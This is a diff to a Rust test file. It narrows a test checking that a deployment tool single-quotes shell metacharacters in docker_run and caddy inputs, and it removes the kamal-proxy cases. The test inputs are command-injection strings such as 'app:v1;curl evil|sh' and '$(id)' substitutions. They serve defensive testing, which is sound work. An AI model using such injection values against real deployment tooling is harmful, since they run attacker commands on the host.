@@ -186,17 +186,15 @@ fn caddy_maintenance_status_code_is_validated() {
     assert!(ok, "valid status_code rejected: {err}");
 }
 
-/// Issue #10 item 4 — metacharacters in docker_run / caddy / kamal-proxy inputs reach the plan
+/// Issue #10 item 4 — metacharacters in docker_run / caddy inputs reach the plan
 /// only as single-quoted words.
 #[test]
 fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
     let (ok, out, err) = run_dry(
         r#"import "lib/docker" as docker;
         import "lib/caddy" as caddy;
-        import "lib/proxy" as proxy;
         docker::docker_run("web1", "app:v1;curl evil|sh", "n$(id)", #{});
-        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });
-        proxy::proxy_deploy("web1", "svc;id", "10.0.0.1:3000", #{ health_path: "/up;$(id)" });"#,
+        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });"#,
     );
     assert!(ok, "dry-run failed: {err}");
     assert!(
@@ -207,10 +205,5 @@ fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
     assert!(
         out.contains(r#"svc'\''x;id"#),
         "caddy service not quoted: {out}"
-    );
-    assert!(out.contains("'svc;id'"), "proxy service not quoted: {out}");
-    assert!(
-        out.contains("'/up;$(id)'"),
-        "proxy health path not quoted: {out}"
     );
 }
